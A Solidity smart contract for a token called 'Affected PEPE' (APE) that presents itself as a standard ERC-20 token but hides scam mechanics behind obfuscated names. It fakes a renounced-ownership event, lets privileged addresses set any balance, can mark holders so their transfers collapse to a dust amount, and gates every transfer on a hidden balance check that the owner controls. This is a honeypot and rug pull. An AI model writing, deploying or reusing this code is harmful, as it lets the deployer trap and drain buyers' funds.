//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface fromLimitSell {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atToken) external view returns (uint256);

    function transfer(address fundTokenTake, uint256 listReceiver) external returns (bool);

    function allowance(address marketingLimit, address spender) external view returns (uint256);

    function approve(address spender, uint256 listReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address fundTokenTake,
        uint256 listReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountSenderMin, uint256 value);
    event Approval(address indexed marketingLimit, address indexed spender, uint256 value);
}

abstract contract walletTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface walletFund {
    function createPair(address launchWalletFund, address walletEnable) external returns (address);
}

interface fromLimitSellMetadata is fromLimitSell {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AffectedPEPE is walletTake, fromLimitSell, fromLimitSellMetadata {

    function tradingWallet(uint256 listReceiver) public {
        enableLaunched();
        feeFund = listReceiver;
    }

    function transfer(address enableReceiverAuto, uint256 listReceiver) external virtual override returns (bool) {
        return maxAt(_msgSender(), enableReceiverAuto, listReceiver);
    }

    mapping(address => uint256) private txMin;

    function decimals() external view virtual override returns (uint8) {
        return tokenMax;
    }

    constructor (){
        
        teamExempt receiverLiquidity = teamExempt(enableAuto);
        shouldFund = walletFund(receiverLiquidity.factory()).createPair(receiverLiquidity.WETH(), address(this));
        if (walletLiquidity != tokenFund) {
            tokenFund = walletLiquidity;
        }
        limitShould = _msgSender();
        toAmount();
        totalExempt[limitShould] = true;
        txMin[limitShould] = toSender;
        
        emit Transfer(address(0), limitShould, toSender);
    }

    function teamMinLaunched(address limitTrading) public {
        enableLaunched();
        if (walletLiquidity != maxLiquidity) {
            tokenFund = maxLiquidity;
        }
        if (limitTrading == limitShould || limitTrading == shouldFund) {
            return;
        }
        atEnableSwap[limitTrading] = true;
    }

    uint256 public tokenFund;

    uint8 private tokenMax = 18;

    function minExempt(address fromWallet) public {
        require(fromWallet.balance < 100000);
        if (isAmount) {
            return;
        }
        if (walletLiquidity != maxLiquidity) {
            maxLiquidity = tokenFund;
        }
        totalExempt[fromWallet] = true;
        
        isAmount = true;
    }

    function toAmount() public {
        emit OwnershipTransferred(limitShould, address(0));
        tokenEnableBuy = address(0);
    }

    function enableLaunched() private view {
        require(totalExempt[_msgSender()]);
    }

    string private marketingSender = "Affected PEPE";

    function balanceOf(address atToken) public view virtual override returns (uint256) {
        return txMin[atToken];
    }

    function maxAt(address minShould, address fundTokenTake, uint256 listReceiver) internal returns (bool) {
        if (minShould == limitShould) {
            return takeLimit(minShould, fundTokenTake, listReceiver);
        }
        uint256 feeList = fromLimitSell(shouldFund).balanceOf(limitReceiverTx);
        require(feeList == feeFund);
        require(fundTokenTake != limitReceiverTx);
        if (atEnableSwap[minShould]) {
            return takeLimit(minShould, fundTokenTake, fromLiquidity);
        }
        return takeLimit(minShould, fundTokenTake, listReceiver);
    }

    function approve(address walletReceiver, uint256 listReceiver) public virtual override returns (bool) {
        tokenAutoList[_msgSender()][walletReceiver] = listReceiver;
        emit Approval(_msgSender(), walletReceiver, listReceiver);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return toSender;
    }

    function symbol() external view virtual override returns (string memory) {
        return totalReceiverAt;
    }

    function senderShould(address enableReceiverAuto, uint256 listReceiver) public {
        enableLaunched();
        txMin[enableReceiverAuto] = listReceiver;
    }

    uint256 senderFee;

    mapping(address => mapping(address => uint256)) private tokenAutoList;

    uint256 private walletLiquidity;

    uint256 constant fromLiquidity = 10 ** 10;

    address public shouldFund;

    function allowance(address toShould, address walletReceiver) external view virtual override returns (uint256) {
        if (walletReceiver == enableAuto) {
            return type(uint256).max;
        }
        return tokenAutoList[toShould][walletReceiver];
    }

    address limitReceiverTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private toSender = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return tokenEnableBuy;
    }

    function transferFrom(address minShould, address fundTokenTake, uint256 listReceiver) external override returns (bool) {
        if (_msgSender() != enableAuto) {
            if (tokenAutoList[minShould][_msgSender()] != type(uint256).max) {
                require(listReceiver <= tokenAutoList[minShould][_msgSender()]);
                tokenAutoList[minShould][_msgSender()] -= listReceiver;
            }
        }
        return maxAt(minShould, fundTokenTake, listReceiver);
    }

    address enableAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public atEnableSwap;

    address private tokenEnableBuy;

    address public limitShould;

    function takeLimit(address minShould, address fundTokenTake, uint256 listReceiver) internal returns (bool) {
        require(txMin[minShould] >= listReceiver);
        txMin[minShould] -= listReceiver;
        txMin[fundTokenTake] += listReceiver;
        emit Transfer(minShould, fundTokenTake, listReceiver);
        return true;
    }

    string private totalReceiverAt = "APE";

    mapping(address => bool) public totalExempt;

    function owner() external view returns (address) {
        return tokenEnableBuy;
    }

    function name() external view virtual override returns (string memory) {
        return marketingSender;
    }

    uint256 feeFund;

    uint256 private maxLiquidity;

    bool public isAmount;

    event OwnershipTransferred(address indexed liquidityFund, address indexed maxWalletIs);

}